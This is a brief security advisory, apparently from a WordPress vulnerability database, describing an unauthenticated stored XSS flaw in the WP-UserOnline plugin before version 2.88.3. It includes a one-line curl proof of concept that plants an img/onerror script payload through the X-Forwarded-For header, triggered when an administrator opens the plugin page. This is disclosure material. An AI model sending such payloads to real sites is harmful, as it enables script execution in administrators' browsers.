## WordPress Plugin Vulnerabilities

# WP-UserOnline < 2.88.3 - Unauthenticated Stored XSS

### Description

The plugin does not sanitise and escape the X-Forwarded-For header before outputting its content on the page, which allows unauthenticated users to perform Cross-Site Scripting attacks.

### Proof of Concept

curl https://example.com -H 'X-Forwarded-For: <img src=x onerror=alert(/xss/)>'
Then, as a high-privileged user, visit `/wp-admin/index.php?page=useronline`

### Affects Plugins
